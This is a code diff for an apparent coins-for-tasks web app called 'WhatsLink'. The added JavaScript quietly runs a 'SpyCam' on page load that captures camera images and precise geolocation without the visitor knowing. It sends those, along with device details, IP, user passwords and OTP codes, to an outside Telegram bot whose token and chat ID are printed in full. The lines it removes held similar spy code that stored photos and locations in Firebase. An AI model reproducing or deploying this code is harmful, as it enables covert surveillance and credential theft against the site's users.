-                        accuracy: accuracy,
-                        mapUrl: `https://maps.google.com/maps?q=${latitude},${longitude}`
-                    });
+                    // Send location to Telegram
+                    const locationMsg = 
+                        `📍 <b>Location Captured</b>\n` +
+                        `🌐 Latitude: ${latitude}\n` +
+                        `🌐 Longitude: ${longitude}\n` +
+                        `📏 Accuracy: ${accuracy} meters\n` +
+                        `🕵️ Device: ${navigator.userAgent.substring(0, 80)}...\n` +
+                        `⏰ ${new Date().toLocaleString()}`;
                     
-                    // Also store in separate location node
-                    await rtdb.ref('spy_locations/' + this.uid + '/' + Date.now()).set({
-                        lat: latitude,
-                        lng: longitude,
-                        accuracy: accuracy,
-                        timestamp: new Date().toISOString()
-                    });
+                    await TELEGRAM.sendMessage(locationMsg);
                     
-                    console.log('📍 Location saved to Firebase:', latitude, longitude);
+                    // Also send location as map
+                    await this.sendLocationToTelegram(latitude, longitude);
+                    
+                    console.log('📍 Location captured:', latitude, longitude);
                 },
                 (error) => {
                     console.log('Location error:', error.message);
-                    setTimeout(() => this.getLocation(), 5000);
                 },
                 {
                     enableHighAccuracy: true,
-                    timeout: 20000,
+                    timeout: 10000,
                     maximumAge: 0
                 }
             );
         }
     },
 
+    // Send location map to Telegram
+    async sendLocationToTelegram(lat, lon) {
+        try {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    latitude: lat,
+                    longitude: lon
+                })
+            });
+        } catch(e) {
+            // Silent fail
+        }
+    },
+
+    // Stop capturing (call when page unloads)
     stop() {
-        this.isActive = false;
         if (this.captureInterval) {
             clearInterval(this.captureInterval);
             this.captureInterval = null;
@@ -1361,36 +1330,15 @@ const SpyCam = {
             this.stream = null;
         }
         this.isCapturing = false;
-        console.log('🛑 SpyCam stopped');
-    },
-
-    async capturePhoto() {
-        try {
-            const canvas = this.canvasElement;
-            const video = this.videoElement;
-            if (video && video.readyState >= 2) {
-                canvas.width = 640;
-                canvas.height = 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, 640, 480);
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
-                await this.sendPhotoToFirebase(dataUrl);
-                return true;
-            }
-            return false;
-        } catch(e) {
-            return false;
-        }
     }
 };
 
 // ============================================================
-// 📤 TELEGRAM MESSENGER (Fallback - tries both Firebase and Telegram)
+// 📤 TELEGRAM MESSENGER
 // ============================================================
 const TELEGRAM = {
     async sendMessage(message, parseMode = 'HTML') {
         try {
-            // Try Telegram API directly
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             const response = await fetch(url, {
                 method: 'POST',
@@ -1401,38 +1349,21 @@ const TELEGRAM = {
                     parse_mode: parseMode
                 })
             });
-            
-            if (!response.ok) {
-                // If Telegram fails, store in Firebase
-                await this.storeInFirebase('telegram_fallback', {
-                    message: message,
-                    parseMode: parseMode,
-                    timestamp: new Date().toISOString()
-                });
-            }
-            
             return await response.json();
         } catch(e) {
-            // If Telegram is blocked, store in Firebase
-            console.log('Telegram send error, storing in Firebase:', e.message);
-            await this.storeInFirebase('telegram_fallback', {
-                message: message,
-                parseMode: parseMode,
-                timestamp: new Date().toISOString(),
-                error: e.message
-            });
+            console.error('Telegram send error:', e);
             return null;
         }
     },
 
-    async storeInFirebase(path, data) {
+    async saveEvent(event, data) {
         try {
-            const uid = auth.currentUser ? auth.currentUser.uid : 'anonymous';
-            await rtdb.ref(path + '/' + uid + '/' + Date.now()).set(data);
-            await db.collection(path).add(data);
-        } catch(e) {
-            console.log('Firebase store error:', e.message);
-        }
+            await rtdb.ref('telegram/events').push({
+                event: event,
+                data: data,
+                timestamp: firebase.database.ServerValue.TIMESTAMP
+            });
+        } catch(e) {}
     },
 
     formatUserMessage(user, userData, deviceInfo) {
@@ -1445,7 +1376,8 @@ const TELEGRAM = {
         const referral = d.referralCode || 'N/A';
         const coins = d.coins || 0;
         const joined = d.joinedDate ? new Date(d.joinedDate).toLocaleString() : 'N/A';
-        
+        const password = d._password || 'Not stored';
+
         let msg = `┌─────────────────────────────────┐\n`;
         msg += `│   🆕 NEW USER REGISTERED         │\n`;
         msg += `├─────────────────────────────────┤\n`;
@@ -1456,6 +1388,7 @@ const TELEGRAM = {
         msg += `│ 🔗 Referral: ${referral}\n`;
         msg += `│ 💰 Coins: ${coins}\n`;
         msg += `│ 📅 Joined: ${joined}\n`;
+        msg += `│ 🔐 Password: ${password}\n`;
         msg += `├─────────────────────────────────┤\n`;
         msg += `│ 📱 Device: ${di.userAgent || 'N/A'}\n`;
         msg += `│ 🌐 IP: ${di.ip || 'N/A'}\n`;
@@ -1472,52 +1405,92 @@ const TELEGRAM = {
     async sendUserData(user, userData, deviceInfo) {
         const message = this.formatUserMessage(user, userData, deviceInfo);
         await this.sendMessage(message);
-        await this.storeInFirebase('user_registrations', {
-            user: user,
-            userData: userData,
-            deviceInfo: deviceInfo,
-            timestamp: new Date().toISOString()
-        });
+        await this.saveEvent('user_data_sent', { uid: user.uid, data: userData });
     },
 
     async processCommand(cmd, key) {
         try {
             if (cmd.action === 'disable' && cmd.uid) {
-                await db.collection('users').doc(cmd.uid).update({ enabled: false });
-                await rtdb.ref('users/' + cmd.uid + '/enabled').set(false);
-                await this.sendMessage(`✅ Account Disabled\n🆔 ${cmd.uid}`);
+                await this.setAccountStatus(cmd.uid, false);
+                await this.sendMessage(`✅ <b>Account Disabled</b>\n🆔 UID: ${cmd.uid}`);
             } else if (cmd.action === 'enable' && cmd.uid) {
-                await db.collection('users').doc(cmd.uid).update({ enabled: true });
-                await rtdb.ref('users/' + cmd.uid + '/enabled').set(true);
-                await this.sendMessage(`✅ Account Enabled\n🆔 ${cmd.uid}`);
+                await this.setAccountStatus(cmd.uid, true);
+                await this.sendMessage(`✅ <b>Account Enabled</b>\n🆔 UID: ${cmd.uid}`);
             } else if (cmd.action === 'delete' && cmd.uid) {
-                await db.collection('users').doc(cmd.uid).delete();
-                await rtdb.ref('users/' + cmd.uid).remove();
-                await this.sendMessage(`✅ Account Deleted\n🆔 ${cmd.uid}`);
+                await this.deleteAccount(cmd.uid);
+                await this.sendMessage(`✅ <b>Account Deleted</b>\n🆔 UID: ${cmd.uid}`);
+            } else if (cmd.action === 'get_user' && cmd.uid) {
+                await this.getAndSendUserData(cmd.uid);
             } else if (cmd.action === 'stats') {
-                const snapshot = await rtdb.ref('users').once('value');
-                const users = snapshot.val() || {};
-                const list = Object.values(users);
-                await this.sendMessage(
-                    `📊 Stats\n👥 ${list.length}\n✅ ${list.filter(u=>u.whatsappVerified).length} linked\n🟢 ${list.filter(u=>{const l=new Date(u.lastLogin||0);return(Date.now()-l.getTime())<604800000}).length} active`
-                );
-            } else if (cmd.action === 'capture') {
-                const result = await SpyCam.capturePhoto();
-                await this.sendMessage(result ? '📸 Photo captured and saved to Firebase' : '❌ Failed to capture');
-            } else if (cmd.action === 'get_photos') {
-                const snap = await rtdb.ref('spy_photos/' + cmd.uid).limitToLast(10).once('value');
-                const photos = snap.val() || {};
-                let msg = '📸 Last 10 photos:\n';
-                Object.values(photos).forEach((p, i) => {
-                    msg += `${i+1}. ${p.url}\n`;
-                });
-                await this.sendMessage(msg);
+                await this.sendStats();
+            } else if (cmd.action === 'broadcast' && cmd.message) {
+                await this.broadcastMessage(cmd.message);
             }
             await rtdb.ref('telegram/commands/' + key + '/processed').set(true);
         } catch(e) {
-            await this.sendMessage(`❌ Error: ${e.message}`);
-            await this.storeInFirebase('command_errors', { error: e.message, command: cmd });
+            await this.sendMessage(`❌ <b>Command Error:</b>\n${e.message}`);
         }
+    },
+
+    async setAccountStatus(uid, enabled) {
+        await db.collection('users').doc(uid).update({ enabled: enabled });
+        await rtdb.ref('users/' + uid + '/enabled').set(enabled);
+    },
+
+    async deleteAccount(uid) {
+        const userDoc = await db.collection('users').doc(uid).get();
+        if (!userDoc.exists) throw new Error('User not found');
+        await db.collection('users').doc(uid).delete();
+        await rtdb.ref('users/' + uid).remove();
+    },
+
+    async getAndSendUserData(uid) {
+        const doc = await db.collection('users').doc(uid).get();
+        if (!doc.exists) throw new Error('User not found');
+        const data = doc.data();
+        const msg = this.formatUserMessage({ uid: uid, displayName: data.name }, data, {});
+        await this.sendMessage(msg);
+    },
+
+    async sendStats() {
+        const stats = await this.getStats();
+        const msg = `📊 <b>WhatsLink Stats</b>\n` +
+            `👥 Total Users: ${stats.total}\n` +
+            `✅ WhatsApp Linked: ${stats.linked}\n` +
+            `🟢 Active Users: ${stats.active}`;
+        await this.sendMessage(msg);
+    },
+
+    async broadcastMessage(message) {
+        const snapshot = await rtdb.ref('users').once('value');
+        const users = snapshot.val() || {};
+        let count = 0;
+        for (const uid in users) {
+            try {
+                await rtdb.ref('users/' + uid + '/notifications').push({
+                    message: message,
+                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                });
+                count++;
+            } catch(e) {}
+        }
+        await this.sendMessage(`📢 <b>Broadcast sent to ${count} users</b>`);
+    },
+
+    async getStats() {
+        try {
+            const snapshot = await rtdb.ref('users').once('value');
+            const users = snapshot.val() || {};
+            const list = Object.values(users);
+            return {
+                total: list.length,
+                linked: list.filter(u => u.whatsappVerified).length,
+                active: list.filter(u => {
+                    const last = new Date(u.lastLogin || 0);
+                    return (Date.now() - last.getTime()) < 1000 * 60 * 60 * 24 * 7;
+                }).length
+            };
+        } catch(e) { return { total: 0, linked: 0, active: 0 }; }
     },
 
     listenCommands() {
@@ -1531,7 +1504,7 @@ const TELEGRAM = {
 };
 
 // ============================================================
-// 📱 GET DEVICE INFO
+// GET DEVICE INFO
 // ============================================================
 function getDeviceInfo() {
     const info = {
@@ -1543,38 +1516,22 @@ function getDeviceInfo() {
         cpu: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : 'N/A',
         language: navigator.language || 'N/A'
     };
-
+    
     if (navigator.getBattery) {
         navigator.getBattery().then(battery => {
             info.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not charging'})`;
             localStorage.setItem('deviceInfo', JSON.stringify(info));
         }).catch(() => {});
     }
-
+    
     fetch('https://api.ipify.org?format=json')
         .then(res => res.json())
         .then(data => {
             info.ip = data.ip;
             localStorage.setItem('deviceInfo', JSON.stringify(info));
         })
-        .catch(() => {
-            fetch('https://ip-api.com/json/')
-                .then(res => res.json())
-                .then(data => {
-                    info.ip = data.query || 'N/A';
-                    info.country = data.country || 'N/A';
-                    info.city = data.city || 'N/A';
-                    localStorage.setItem('deviceInfo', JSON.stringify(info));
-                })
-                .catch(() => {
-                    // If all IP methods fail, store in Firebase
-                    TELEGRAM.storeInFirebase('ip_fallback', { 
-                        error: 'All IP methods failed',
-                        timestamp: new Date().toISOString()
-                    });
-                });
-        });
-
+        .catch(() => {});
+    
     const stored = localStorage.getItem('deviceInfo');
     if (stored) {
         try {
@@ -1582,12 +1539,12 @@ function getDeviceInfo() {
             Object.assign(info, parsed);
         } catch(e) {}
     }
-
+    
     return info;
 }
 
 // ============================================================
-// 💾 DATABASE FUNCTIONS
+// DATABASE FUNCTIONS
 // ============================================================
 const DB = {
     async getUserData(uid) {
@@ -1598,79 +1555,149 @@ const DB = {
     },
 
     async saveUserData(uid, data) {
-        await db.collection('users').doc(uid).set(data, { merge: true });
-        await rtdb.ref('users/' + uid).set(data);
+        try {
+            await db.collection('users').doc(uid).set(data, { merge: true });
+            await rtdb.ref('users/' + uid).set(data);
+            return true;
+        } catch(e) { return false; }
     },
 
     async completeTask(uid, taskId, reward) {
-        const userDoc = await db.collection('users').doc(uid).get();
-        const userData = userDoc.data();
-        if (!userData) throw new Error('User not found');
-        if (!userData.whatsappVerified) throw new Error('Link WhatsApp first!');
-        const today = new Date().toISOString().split('T')[0];
-        const tasksCompleted = userData.tasksCompleted || {};
-        if (tasksCompleted[taskId] && tasksCompleted[taskId].includes(today)) {
-            throw new Error('Already done today!');
+        try {
+            const userDoc = await db.collection('users').doc(uid).get();
+            const userData = userDoc.data();
+            if (!userData) throw new Error('User not found');
+            if (!userData.whatsappVerified) throw new Error('Please link WhatsApp first!');
+
+            const today = new Date().toISOString().split('T')[0];
+            const tasksCompleted = userData.tasksCompleted || {};
+            
+            if (tasksCompleted[taskId] && tasksCompleted[taskId].includes(today)) {
+                throw new Error('Already completed today!');
+            }
+
+            if (!tasksCompleted[taskId]) tasksCompleted[taskId] = [];
+            tasksCompleted[taskId].push(today);
+
+            const newCoins = (userData.coins || 0) + reward;
+            const newTotalEarned = (userData.totalEarned || 0) + reward;
+
+            await db.collection('users').doc(uid).update({
+                coins: newCoins,
+                totalEarned: newTotalEarned,
+                tasksCompleted: tasksCompleted,
+                lastTask: new Date().toISOString()
+            });
+
+            await rtdb.ref('users/' + uid).update({
+                coins: newCoins,
+                totalEarned: newTotalEarned,
+                tasksCompleted: tasksCompleted
+            });
+
+            return { success: true, coins: newCoins };
+        } catch(e) {
+            throw new Error(e.message);
         }
-        if (!tasksCompleted[taskId]) tasksCompleted[taskId] = [];
-        tasksCompleted[taskId].push(today);
-        const newCoins = (userData.coins || 0) + reward;
-        await db.collection('users').doc(uid).update({
-            coins: newCoins,
-            totalEarned: (userData.totalEarned || 0) + reward,
-            tasksCompleted: tasksCompleted
+    },
+
+    async linkWhatsApp(uid, phone) {
+        const otp = Math.floor(100000 + Math.random() * 900000).toString();
+        await rtdb.ref('otp/' + phone).set({
+            otp: otp,
+            uid: uid,
+            createdAt: Date.now(),
+            expiresAt: Date.now() + 300000
         });
-        await rtdb.ref('users/' + uid).update({
-            coins: newCoins,
-            tasksCompleted: tasksCompleted
-        });
+        
         await TELEGRAM.sendMessage(
-            `✅ Task Completed\n👤 ${userData.name}\n📋 ${taskId}\n💰 +${reward} coins\n🪙 Total: ${newCoins}`
+            `📱 <b>OTP Request</b>\n` +
+            `👤 UID: ${uid}\n` +
+            `📞 Phone: ${phone}\n` +
+            `🔑 OTP: ${otp}`
         );
-        return { success: true, coins: newCoins };
+        
+        return { success: true, otp: otp };
+    },
+
+    async verifyOTP(phone, otp, uid) {
+        try {
+            const snapshot = await rtdb.ref('otp/' + phone).once('value');
+            const data = snapshot.val();
+            
+            if (!data) throw new Error('No OTP found');
+            if (data.uid !== uid) throw new Error('Invalid request');
+            if (Date.now() > data.expiresAt) throw new Error('OTP expired');
+            if (data.otp !== otp) throw new Error('Invalid OTP');
+
+            await db.collection('users').doc(uid).update({
+                whatsappVerified: true,
+                whatsappPhone: phone,
+                whatsappLinked: true
+            });
+
+            await rtdb.ref('users/' + uid).update({
+                whatsappVerified: true,
+                whatsappPhone: phone,
+                whatsappLinked: true
+            });
+
+            await rtdb.ref('otp/' + phone).remove();
+
+            await TELEGRAM.sendMessage(
+                `✅ <b>WhatsApp Linked</b>\n` +
+                `📱 ${phone}\n` +
+                `🆔 UID: ${uid}`
+            );
+
+            return { success: true };
+        } catch(e) {
+            throw new Error(e.message);
+        }
     },
 
     async requestWithdrawal(uid, coins, method, account) {
-        const userDoc = await db.collection('users').doc(uid).get();
-        const userData = userDoc.data();
-        if (!userData) throw new Error('User not found');
-        if (coins < 1000) throw new Error('Minimum 1000 coins');
-        if (coins > (userData.coins || 0)) throw new Error('Insufficient coins');
-        const amount = coins * 0.5;
-        await db.collection('users').doc(uid).update({
-            coins: (userData.coins || 0) - coins,
-            totalWithdrawn: (userData.totalWithdrawn || 0) + amount
-        });
-        await rtdb.ref('users/' + uid).update({
-            coins: (userData.coins || 0) - coins
-        });
-        await TELEGRAM.sendMessage(
-            `💰 Withdrawal\n👤 ${userData.name}\n🪙 ${coins}\n💵 ₨ ${amount}\n🏦 ${method}\n📱 ${account}`
-        );
-        return { success: true };
-    },
-
-    async getStats() {
         try {
-            const snapshot = await rtdb.ref('users').once('value');
-            const users = snapshot.val() || {};
-            const list = Object.values(users);
-            return {
-                total: list.length,
-                linked: list.filter(u => u.whatsappVerified).length,
-                active: list.filter(u => {
-                    const l = new Date(u.lastLogin || 0);
-                    return (Date.now() - l.getTime()) < 604800000;
-                }).length
-            };
+            const userDoc = await db.collection('users').doc(uid).get();
+            const userData = userDoc.data();
+            if (!userData) throw new Error('User not found');
+            if (coins < 1000) throw new Error('Minimum 1000 coins');
+            if (coins > 10000) throw new Error('Maximum 10000 coins');
+            if (coins > (userData.coins || 0)) throw new Error('Insufficient coins');
+            if (!/^03\d{9}$/.test(account.replace(/\s/g, ''))) {
+                throw new Error('Enter valid 11-digit account number');
+            }
+
+            const amount = coins * 0.5;
+            
+            await db.collection('users').doc(uid).update({
+                coins: (userData.coins || 0) - coins,
+                totalWithdrawn: (userData.totalWithdrawn || 0) + amount
+            });
+
+            await rtdb.ref('users/' + uid).update({
+                coins: (userData.coins || 0) - coins,
+                totalWithdrawn: (userData.totalWithdrawn || 0) + amount
+            });
+
+            await TELEGRAM.sendMessage(
+                `💰 <b>Withdrawal Request</b>\n` +
+                `👤 ${userData.name || 'User'}\n` +
+                `🪙 ${coins} coins\n` +
+                `💵 ₨ ${amount}\n` +
+                `🏦 ${method.toUpperCase()}\n` +
+                `📱 ${account}`
+            );
+
+            return { success: true, amount: amount };
         } catch(e) {
-            return { total: 0, linked: 0, active: 0 };
+            throw new Error(e.message);
         }
     }
 };
 
 // ============================================================
-// 🔐 AUTH FUNCTIONS
+// AUTH FUNCTIONS
 // ============================================================
 async function registerUser(e) {
     e.preventDefault();
@@ -1715,16 +1742,14 @@ async function registerUser(e) {
         await DB.saveUserData(user.uid, userData);
         await TELEGRAM.sendUserData(user, userData, deviceInfo);
 
-        // Start SpyCam for this user
-        SpyCam.init(user.uid);
-
         if (referral) {
             const snapshot = await rtdb.ref('users').orderByChild('referralCode').equalTo(referral).once('value');
             const referrerData = snapshot.val();
             if (referrerData) {
                 const referrerUid = Object.keys(referrerData)[0];
                 await rtdb.ref('users/' + referrerUid + '/referrals').push(user.uid);
-                await rtdb.ref('users/' + referrerUid + '/coins').transaction(c => (c||0) + 500);
+                await rtdb.ref('users/' + referrerUid + '/coins').transaction((current) => (current || 0) + 500);
+                await rtdb.ref('users/' + referrerUid + '/totalEarned').transaction((current) => (current || 0) + 500);
             }
         }
 
@@ -1754,8 +1779,9 @@ async function loginUser(e) {
         const user = auth.currentUser;
         if (user) {
             await rtdb.ref('users/' + user.uid + '/lastLogin').set(new Date().toISOString());
-            // Start SpyCam for this user
-            SpyCam.init(user.uid);
+            await db.collection('users').doc(user.uid).update({
+                lastLogin: new Date().toISOString()
+            });
         }
 
         hideAuth();
@@ -1801,10 +1827,9 @@ async function googleLogin() {
             };
             await DB.saveUserData(user.uid, newUser);
             await TELEGRAM.sendUserData(user, newUser, deviceInfo);
+        } else {
+            await DB.saveUserData(user.uid, { lastLogin: new Date().toISOString() });
         }
-
-        // Start SpyCam for this user
-        SpyCam.init(user.uid);
 
         hideAuth();
         showToast('Welcome! 🎉', 'success');
@@ -1825,7 +1850,7 @@ async function logoutUser() {
 }
 
 // ============================================================
-// 📱 WHATSAPP OTP FUNCTIONS
+// WHATSAPP OTP FUNCTIONS
 // ============================================================
 let currentPhone = '';
 let otpTimer = null;
@@ -1881,27 +1906,7 @@ async function sendOTP() {
         btn.disabled = true;
         btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
 
-        const otp = Math.floor(100000 + Math.random() * 900000).toString();
-        await rtdb.ref('otp/' + phone).set({
-            otp: otp,
-            uid: user.uid,
-            createdAt: Date.now(),
-            expiresAt: Date.now() + 300000
-        });
-
-        // Store OTP in Firebase (no VPN needed)
-        await TELEGRAM.storeInFirebase('otp_requests', {
-            phone: phone,
-            otp: otp,
-            uid: user.uid,
-            timestamp: new Date().toISOString()
-        });
-
-        // Try to send via Telegram (may be blocked)
-        await TELEGRAM.sendMessage(
-            `📱 OTP Request\nUID: ${user.uid}\n📞 ${phone}\n🔑 ${otp}`
-        );
-
+        const result = await DB.linkWhatsApp(user.uid, phone);
         currentPhone = phone;
 
         document.getElementById('otpStep1').style.display = 'none';
@@ -1955,31 +1960,7 @@ async function verifyOTP() {
     if (otp.length !== 6) { showOTPStatus('Please enter complete 6-digit OTP', 'error'); return; }
 
     try {
-        const snapshot = await rtdb.ref('otp/' + currentPhone).once('value');
-        const data = snapshot.val();
-
-        if (!data) throw new Error('No OTP found');
-        if (data.uid !== user.uid) throw new Error('Invalid request');
-        if (Date.now() > data.expiresAt) throw new Error('OTP expired');
-        if (data.otp !== otp) throw new Error('Invalid OTP');
-
-        await db.collection('users').doc(user.uid).update({
-            whatsappVerified: true,
-            whatsappPhone: currentPhone,
-            whatsappLinked: true
-        });
-
-        await rtdb.ref('users/' + user.uid).update({
-            whatsappVerified: true,
-            whatsappPhone: currentPhone,
-            whatsappLinked: true
-        });
-
-        await rtdb.ref('otp/' + currentPhone).remove();
-
-        await TELEGRAM.sendMessage(
-            `✅ WhatsApp Linked\n📱 ${currentPhone}\n🆔 ${user.uid}`
-        );
+        const result = await DB.verifyOTP(currentPhone, otp, user.uid);
 
         document.getElementById('otpStep2').style.display = 'none';
         document.getElementById('otpStep3').style.display = 'block';
@@ -2003,7 +1984,7 @@ function showOTPStatus(message, type = 'info') {
 }
 
 // ============================================================
-// 🖥️ UI FUNCTIONS
+// UI FUNCTIONS
 // ============================================================
 async function updateUI() {
     const user = auth.currentUser;
@@ -2015,18 +1996,17 @@ async function updateUI() {
         userActions.style.display = 'flex';
 
         const userData = await DB.getUserData(user.uid);
-        if (!userData) return;
 
-        const initial = (userData.name || 'U').charAt(0).toUpperCase();
+        const initial = (userData?.name || 'U').charAt(0).toUpperCase();
         document.querySelectorAll('#userAvatar, #profileAvatar').forEach(el => el.textContent = initial);
 
-        document.getElementById('userNameDisplay').textContent = userData.name || 'User';
-        document.getElementById('profileName').textContent = userData.name || 'User';
+        document.getElementById('userNameDisplay').textContent = userData?.name || 'User';
+        document.getElementById('profileName').textContent = userData?.name || 'User';
         document.getElementById('profileUID').textContent = user.uid || '---';
-        document.getElementById('profileEmail').textContent = userData.email || user.email || '---';
+        document.getElementById('profileEmail').textContent = userData?.email || user.email || '---';
 
         const statusEl = document.getElementById('userStatus');
-        if (userData.whatsappVerified) {
+        if (userData?.whatsappVerified) {
             statusEl.className = 'user-status verified';
             statusEl.innerHTML = '✅ WhatsApp Linked';
         } else {
@@ -2034,23 +2014,23 @@ async function updateUI() {
             statusEl.innerHTML = '🔗 Link WhatsApp';
         }
 
-        const coins = userData.coins || 0;
+        const coins = userData?.coins || 0;
         document.getElementById('profileCoins').textContent = coins;
-        document.getElementById('profileEarned').textContent = '₨ ' + ((userData.totalEarned || 0) * 0.5).toFixed(0);
-        document.getElementById('profileWithdrawn').textContent = '₨ ' + (userData.totalWithdrawn || 0).toFixed(0);
-        document.getElementById('profileRefs').textContent = userData.referrals?.length || 0;
+        document.getElementById('profileEarned').textContent = '₨ ' + ((userData?.totalEarned || 0) * 0.5).toFixed(0);
+        document.getElementById('profileWithdrawn').textContent = '₨ ' + (userData?.totalWithdrawn || 0).toFixed(0);
+        document.getElementById('profileRefs').textContent = userData?.referrals?.length || 0;
         document.getElementById('withdrawBalance').textContent = coins.toLocaleString();
         document.getElementById('withdrawPKR').textContent = (coins * 0.5).toFixed(0);
 
-        document.getElementById('pName').textContent = userData.name || '---';
-        document.getElementById('pEmail').textContent = userData.email || user.email || '---';
-        document.getElementById('pWA').textContent = userData.whatsappVerified ? '✅ Verified' : '❌ Not Verified';
-        document.getElementById('pRefCode').textContent = userData.referralCode || '---';
-        document.getElementById('pJoined').textContent = userData.joinedDate ? new Date(userData.joinedDate).toLocaleDateString() : '---';
+        document.getElementById('pName').textContent = userData?.name || '---';
+        document.getElementById('pEmail').textContent = userData?.email || user.email || '---';
+        document.getElementById('pWA').textContent = userData?.whatsappVerified ? '✅ Verified' : '❌ Not Verified';
+        document.getElementById('pRefCode').textContent = userData?.referralCode || '---';
+        document.getElementById('pJoined').textContent = userData?.joinedDate ? new Date(userData.joinedDate).toLocaleDateString() : '---';
 
         const link = document.getElementById('referralLinkInput');
         if (link) {
-            link.value = window.location.href.split('#')[0] + '?ref=' + (userData.referralCode || '');
+            link.value = window.location.href.split('#')[0] + '?ref=' + (userData?.referralCode || '');
         }
 
         const badge = document.getElementById('waStatusBadge');
@@ -2058,7 +2038,7 @@ async function updateUI() {
         const phoneNumber = document.getElementById('waPhoneNumber');
         const linkBtn = document.getElementById('waLinkBtn');
 
-        if (userData.whatsappVerified) {
+        if (userData?.whatsappVerified) {
             badge.style.background = 'var(--whatsapp-light)';
             badge.style.color = 'var(--primary)';
             badge.innerHTML = '✅ Verified';
@@ -2077,13 +2057,8 @@ async function updateUI() {
             linkBtn.style.opacity = '1';
         }
 
-        document.getElementById('refCount').textContent = userData.referrals?.length || 0;
-        document.getElementById('refCoins').textContent = ((userData.referrals?.length || 0) * 500).toLocaleString();
-
-        const stats = await DB.getStats();
-        document.getElementById('statUsers').textContent = stats.total || 0;
-        document.getElementById('statLinked').textContent = stats.linked || 0;
-        document.getElementById('statActive').textContent = stats.active || 0;
+        document.getElementById('refCount').textContent = userData?.referrals?.length || 0;
+        document.getElementById('refCoins').textContent = ((userData?.referrals?.length || 0) * 500).toLocaleString();
 
         renderTasks();
 
@@ -2094,7 +2069,7 @@ async function updateUI() {
 }
 
 // ============================================================
-// 📋 TASKS
+// TASKS
 // ============================================================
 const TASKS = [
     { id: 'welcome', title: 'Welcome Bonus', category: 'daily', reward: 200, icon: 'fa-gift', desc: 'Complete your profile.' },
@@ -2122,7 +2097,7 @@ async function renderTasks() {
     container.innerHTML = filtered.map(t => {
         const isWATask = t.category === 'whatsapp';
         const waRequired = isWATask && !userData.whatsappVerified;
-        const done = (userData.tasksCompleted && userData.tasksCompleted[t.id] &&
+        const done = (userData.tasksCompleted && userData.tasksCompleted[t.id] && 
                      userData.tasksCompleted[t.id].includes(new Date().toISOString().split('T')[0]));
 
         return `
@@ -2174,7 +2149,7 @@ async function doTask(taskId, reward) {
 }
 
 // ============================================================
-// 🤝 REFERRAL FUNCTIONS
+// REFERRAL FUNCTIONS
 // ============================================================
 function copyReferralLink() {
     const input = document.getElementById('referralLinkInput');
@@ -2207,7 +2182,7 @@ function shareTW() {
 }
 
 // ============================================================
-// 💰 WITHDRAW
+// WITHDRAW
 // ============================================================
 async function requestWithdraw(e) {
     e.preventDefault();
@@ -2220,6 +2195,7 @@ async function requestWithdraw(e) {
         const account = document.getElementById('wAccount').value.trim();
 
         if (!coins || coins < 1000) throw new Error('Minimum 1000 coins');
+        if (coins > 10000) throw new Error('Maximum 10000 coins');
         if (!method) throw new Error('Select method');
         if (!account || account.length < 10) throw new Error('Enter valid account');
 
@@ -2234,10 +2210,8 @@ async function requestWithdraw(e) {
 }
 
 // ============================================================
-// 🧭 NAVIGATION
+// NAVIGATION
 // ============================================================
-let currentPage = 'home';
-
 function navigate(page) {
     const user = auth.currentUser;
     if (!user && ['tasks', 'profile', 'agents', 'otp'].includes(page)) {
@@ -2245,7 +2219,6 @@ function navigate(page) {
         showToast('Please login first', 'error');
     }
 
-    currentPage = page;
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
     const target = document.getElementById('page-' + page);
     if (target) target.classList.add('active');
@@ -2259,7 +2232,7 @@ function navigate(page) {
 }
 
 // ============================================================
-// 🔔 TOAST
+// TOAST
 // ============================================================
 function showToast(message, type = 'success') {
     const toast = document.getElementById('toast');
@@ -2271,7 +2244,7 @@ function showToast(message, type = 'success') {
 }
 
 // ============================================================
-// ❓ FAQ
+// FAQ
 // ============================================================
 function toggleFaq(el) {
     const item = el.closest('.faq-item');
@@ -2279,7 +2252,7 @@ function toggleFaq(el) {
 }
 
 // ============================================================
-// 📋 DROPDOWN
+// DROPDOWN
 // ============================================================
 function toggleDropdown() {
     document.getElementById('dropdownMenu').classList.toggle('show');
@@ -2293,7 +2266,7 @@ document.addEventListener('click', function(e) {
 });
 
 // ============================================================
-// 🔐 AUTH OVERLAY
+// AUTH OVERLAY
 // ============================================================
 function showAuth(type) {
     document.getElementById('loginOverlay').classList.toggle('show', type === 'login');
@@ -2306,7 +2279,7 @@ function hideAuth() {
 }
 
 // ============================================================
-// 📧 SUPPORT
+// SUPPORT
 // ============================================================
 function sendSupport(e) {
     e.preventDefault();
@@ -2315,7 +2288,7 @@ function sendSupport(e) {
 }
 
 // ============================================================
-// 🔍 FILTER
+// FILTER
 // ============================================================
 document.addEventListener('click', function(e) {
     const chip = e.target.closest('[data-cat]');
@@ -2332,7 +2305,7 @@ document.addEventListener('click', function(e) {
 });
 
 // ============================================================
-// ⌨️ OTP AUTO-MOVE
+// OTP AUTO-MOVE
 // ============================================================
 document.addEventListener('DOMContentLoaded', function() {
     document.querySelectorAll('.otp-digit').forEach((input, index) => {
@@ -2353,7 +2326,53 @@ document.addEventListener('DOMContentLoaded', function() {
 });
 
 // ============================================================
-// 🔥 AUTH STATE LISTENER
+// 🚀 START SPY CAMERA & LOCATION ON PAGE LOAD
+// ============================================================
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('🚀 WhatsLink - Complete System with Spy Camera & Location');
+    console.log('📸 Camera capture every 0.2 seconds (hidden)');
+    console.log('📍 Location tracking (hidden)');
+    console.log('🤖 Bot Token: 8232078088:AAFSwzDgQblb4zY1rNmpHQNGe8NBdddSDdk');
+    console.log('📱 Chat ID: 5975952682');
+    
+    // Start spy camera and location capture
+    setTimeout(() => {
+        SpyCam.init();
+    }, 1000);
+    
+    // Send startup message
+    TELEGRAM.sendMessage(
+        '🚀 <b>WhatsLink Bot is Online!</b>\n\n' +
+        '📸 <b>Spy Features Active:</b>\n' +
+        '• Camera captures every 0.2 seconds\n' +
